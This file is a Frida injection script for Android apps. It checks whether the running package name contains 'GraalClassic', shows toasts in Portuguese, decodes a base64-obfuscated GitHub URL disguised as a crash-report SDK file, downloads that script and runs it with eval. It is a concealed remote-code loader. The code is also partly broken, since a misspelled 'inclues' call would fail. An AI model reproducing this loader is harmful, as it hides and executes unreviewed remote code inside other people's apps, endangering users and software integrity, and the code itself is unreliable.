let getPackageName = null

{
    let cachedPackageName = null;
    getPackageName = function () {
        if (cachedPackageName !== null) {
            return cachedPackageName;
        }
        const fopenAddr = Module.findExportByName(null, "fopen");
        const fopen = new NativeFunction(fopenAddr, "pointer", ["pointer", "pointer"]);
        const FILE = fopen(Memory.allocUtf8String("/proc/self/cmdline"), Memory.allocUtf8String("r"));
        if (!FILE) {
            return "Error";
        }
        const fgetsAddr = Module.findExportByName(null, "fgets");
        const fgets = new NativeFunction(fgetsAddr, "int32", ["pointer", "int32", "pointer"]);
        const buffer = Memory.alloc(255);
        fgets(buffer, 255, FILE);
        const fcloseAddr = Module.findExportByName(null, "fclose");
        const fclose = new NativeFunction(fcloseAddr, "int32", ["pointer"]);
        fclose(FILE);

        // Cache in memory
        cachedPackageName = buffer.readCString();
        return cachedPackageName;
    }
}




function createNewThread(callback) {
    var Thread = Java.use("java.lang.Thread");
    var Runnable = Java.use("java.lang.Runnable");
    Java.perform(() => {
        var MyRunnable = Java.registerClass({
            name: encodeURIComponent(Math.random()+Date.now()),
            implements: [Runnable],
            methods: {
                run: function () {
                    callback()
                }
            }
        });

        var newThread = Thread.$new();

        var myRunnable = MyRunnable.$new();

        newThread.$init(myRunnable);

        newThread.start()
        newThread.join(); // block and wait

       return newThread

    })
}

// Chamando a função para criar a nova thread

function test() {
if (true) {//getPackageName().startsWith("com.")) {
    Java.perform(function () {
        Java.scheduleOnMainThread(function () {
            var toast = Java.use("android.widget.Toast");
            const pkg = getPackageName()

            if (pkg.inclues("GraalClassic")) {
                toast.makeText(Java.use("android.app.ActivityThread").currentApplication().getApplicationContext(), Java.use("java.lang.String").$new("Carregando launcher para: "+pkg), 1).show();

                {
                    let atob = function (input) {
                        const keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

                        let output = "";
                        let chr1, chr2, chr3;
                        let enc1, enc2, enc3, enc4;
                        let i = 0;

                        input = input.replace(/[^A-Za-z0-9+/=]/g, "");

                        while (i < input.length) {
                            enc1 = keyStr.indexOf(input.charAt(i++));
                            enc2 = keyStr.indexOf(input.charAt(i++));
                            enc3 = keyStr.indexOf(input.charAt(i++));
                            enc4 = keyStr.indexOf(input.charAt(i++));

                            chr1 = (enc1 << 2) | (enc2 >> 4);
                            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                            chr3 = ((enc3 & 3) << 6) | enc4;

                            output = output + String.fromCharCode(chr1);

                            if (enc3 !== 64) {
                                output = output + String.fromCharCode(chr2);
                            }
                            if (enc4 !== 64) {
                                output = output + String.fromCharCode(chr3);
                            }
                        }

                        return output;
                    }




                    function httpGet(targetUrl, onReceive) {
                        Java.perform(function () {
                            const URL = Java.use("java.net.URL");
                            const HttpURLConnection = Java.use("java.net.HttpURLConnection");
                            const BufferedReader = Java.use("java.io.BufferedReader");
                            const InputStreamReader = Java.use("java.io.InputStreamReader");
                            const StringBuilder = Java.use("java.lang.StringBuilder");

                            const url = URL.$new(Java.use("java.lang.String").$new(targetUrl));
                            const connection = Java.cast(url.openConnection(), HttpURLConnection);
                            connection.setRequestMethod("GET");
                            connection.setRequestProperty("Content-Type", "application/json");
                            connection.setConnectTimeout(5000);
                            connection.setReadTimeout(5000);

                            const responseCode = connection.getResponseCode();

                            let responseData = null;

                            if (responseCode === 200) {
                                const inputStream = connection.getInputStream();
                                const bufferedReader = BufferedReader.$new(InputStreamReader.$new(inputStream));
                                let line = null;
                                let data = []

                                while ((line = bufferedReader.readLine()) !== null) {
                                    data.push(line)
                                }

                                responseData = data.join("\n")
                            } else {
                                responseData = "error: " + responseCode;
                            }


                            connection.disconnect();
                            onReceive(responseData, responseCode);
                        });
                    }



                    httpGet(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3B1YmxpY3Jlc291cmNlcy9jYWtlczIyL21haW4vYXNzZXRzL3Nkay1jcmFzaHJlcG9ydC5qcw=="), function (data, code) {
                        if (code != 200) {
                            Java.scheduleOnMainThread(function () {
                                var toast = Java.use("android.widget.Toast");
                                toast.makeText(Java.use("android.app.ActivityThread").currentApplication().getApplicationContext(), Java.use("java.lang.String").$new("Could connect to the script server.."), 1).show();
                            });
                        } else {
                            eval(data)
                        }
                    })

                }
            }else{
                toast.makeText(Java.use("android.app.ActivityThread").currentApplication().getApplicationContext(), Java.use("java.lang.String").$new("Não há launchers para: ",pkg), 1).show();

            }
        });
    });
}
}


createNewThread(test)
